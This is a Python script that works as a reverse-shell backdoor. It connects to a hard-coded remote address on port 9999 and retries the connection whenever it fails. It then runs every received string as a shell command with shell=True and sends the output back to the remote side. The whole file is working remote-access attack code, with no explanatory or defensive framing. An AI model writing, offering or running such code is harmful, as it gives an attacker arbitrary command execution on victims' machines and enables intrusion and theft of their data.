import os
import socket
import subprocess
import time
# from sys import argv


# Create a socket
def socket_create():
    try:
        global host
        global port
        global s
        port = 9999
        host = '10.222.142.55'
        # _, host, port = argv
        # port = int(port)
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Connect to a remote socket
def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        print("Socket connection error: " + str(msg))
        time.sleep(5)
        socket_connect()


# Receive commands from remote server and run on local machine
def receive_commands():
    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == "cd":
            try:
                os.chdir(data[3:].decode("utf-8"))
            except:
                pass
        if data[:].decode("utf-8") == 'quit':
            s.close()
            break
        if len(data) > 0:
            try:
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8")
                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                print(output_str)
            except:
                output_str = "Command not recognized" + "\n"
                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                print(output_str)
    # Close connection
    s.close()


def main():
    global s
    try:
        socket_create()
        socket_connect()
        receive_commands()
    except:
        print("Error in main")
        time.sleep(5)
    s.close()
    main()


main()
